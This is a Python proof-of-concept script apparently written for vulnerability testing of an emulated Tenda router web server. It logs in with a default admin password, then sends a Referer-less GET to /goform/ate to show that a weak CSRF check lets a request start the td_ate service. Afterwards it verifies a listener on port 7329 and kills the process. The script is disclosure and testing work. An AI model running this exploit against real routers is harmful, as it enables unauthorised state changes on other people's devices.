#!/usr/bin/env python3
"""
PoC: authenticated state-changing GET succeeds without a Referer.

This demonstrates the weak CSRF gate. It logs in, calls /goform/ate without a
Referer header, validates td_ate starts, then cleans it up by default.
"""

import argparse
import hashlib
import http.cookiejar
import ipaddress
import json
import socket
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request


def require_private_target(base_url, allow_nonlocal):
    host = urllib.parse.urlparse(base_url).hostname
    ip = ipaddress.ip_address(socket.gethostbyname(host))
    if not allow_nonlocal and not (ip.is_loopback or ip.is_private):
        raise SystemExit(f"refusing non-private target {ip}; pass --allow-nonlocal for authorized testing")


def docker_sh(container, command):
    return subprocess.run(["docker", "exec", container, "/bin/sh", "-c", command], text=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, check=False).stdout


def cleanup_ate(container):
    docker_sh(container, "for p in $(ps | awk '/[t]d_ate/{print $1}'); do kill -9 \"$p\" 2>/dev/null || true; done")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="http://127.0.0.1:18080")
    parser.add_argument("--password", default="Tenda_888888")
    parser.add_argument("--container", default="tenda-b104-native-httpd")
    parser.add_argument("--no-cleanup", action="store_true")
    parser.add_argument("--allow-nonlocal", action="store_true")
    args = parser.parse_args()

    require_private_target(args.target, args.allow_nonlocal)
    cleanup_ate(args.container)

    jar = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
    payload = {"username": "admin", "password": hashlib.md5(args.password.encode()).hexdigest()}
    login = urllib.request.Request(args.target.rstrip("/") + "/login/Auth", data=json.dumps(payload).encode(), method="POST", headers={"Content-Type": "application/json; charset=UTF-8"})
    with opener.open(login, timeout=5) as resp:
        login_body = resp.read().decode(errors="replace")

    ate = urllib.request.Request(args.target.rstrip("/") + "/goform/ate", method="GET", headers={})
    try:
        with opener.open(ate, timeout=5) as resp:
            ate_status = resp.status
            ate_body = resp.read()
    except urllib.error.HTTPError as exc:
        ate_status = exc.code
        ate_body = exc.read()
    except urllib.error.URLError as exc:
        ate_status = 0
        ate_body = str(exc).encode()

    time.sleep(1)
    listeners = docker_sh(args.container, "ps; ss -lunp 2>/dev/null || true")
    vulnerable = "td_ate" in listeners and ":7329" in listeners
    print("[login] " + login_body)
    print("[csrf] authenticated GET /goform/ate with no Referer")
    print(f"  status={ate_status} body={ate_body[:120]!r}")
    print("  vulnerable=" + str(vulnerable))
    if vulnerable:
        print("  cvss evidence: authenticated CSRF/state-change weakness; no per-request CSRF token required")
    else:
        print(listeners)

    if not args.no_cleanup:
        cleanup_ate(args.container)
        print("[cleanup] killed spawned td_ate")

    sys.exit(0 if vulnerable else 1)


if __name__ == "__main__":
    main()
